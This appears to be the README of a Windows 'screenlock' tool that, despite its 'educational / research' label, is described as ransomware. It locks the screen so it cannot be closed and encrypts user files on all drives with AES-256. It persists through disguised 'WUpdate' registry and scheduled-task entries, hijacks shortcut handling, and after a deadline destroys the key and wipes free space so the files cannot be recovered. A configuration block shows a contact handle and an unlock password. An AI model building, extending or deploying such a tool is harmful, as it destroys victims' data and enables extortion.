# screenlock

A Windows screenlocker with background file encryption, password-based unlock, and configurable persistence. Educational / research project. Cross-compiled on Fedora with `mingw-w64`, statically linked, no runtime dependencies on the target machine.

---

## Overview

`screenlock.exe` does four things:

1. Shows a fullscreen lock window immediately on launch
2. Encrypts user files on all fixed and removable drives in a background thread
3. Waits for a password to unlock
4. On correct password, decrypts every `.locked` file back to its original name and content, restores desktop shortcuts, removes persistence, and exits

Everything is in one file. No server, no callback, no listener. The image on the lock screen is fetched from a URL into memory at render time — nothing is downloaded to disk.

## Features

- **Fullscreen lock UI** — topmost, taskbar hidden, Esc/Alt+F4/WM_CLOSE swallowed
- **Background encryption** — AES-256-CTR, runs in worker threads per drive
- **Password unlock** — `Ctrl+Shift+U` opens the password dialog; correct password triggers full decryption
- **Decryption on unlock** — every `.locked` file is walked and restored to original name and content
- **Persistence** — `HKCU\Run\WUpdate` + `schtasks ONLOGON\WUpdateSvc`
- **Respawn watchdog** — if the lock window is killed, respawns within 5 seconds
- **Shortcut lockdown** — `.lnk` handler hijacked via `HKEY_CLASSES_ROOT`, desktop shortcuts hidden
- **Deadman timer** — configurable days; if no unlock, key is destroyed and files are re-encrypted with a throwaway key, plus `cipher /w:` free-space wipe → unrecoverable
- **Image from URL** — fetched at runtime via WinHTTP, decoded with GDI+ in memory, scaled to screen. No file written
- **No dependencies** — statically linked, runs on any Windows 7+ x64

## Configuration

At the top of `screenlock.cpp`:

```cpp
static const char* CONTACT       = "@hatejail";        // shown on lock screen
static const char* UNLOCK_PW     = "fuckgovernment";   // plain strcmp
static const int   DEADLINE_DAYS = 3;                  // deadman timeout
static const char* EXT           = ".locked";          // file extension
static const wchar_t* IMG_URL    = L"https://...";     // image URL, fetched into memory
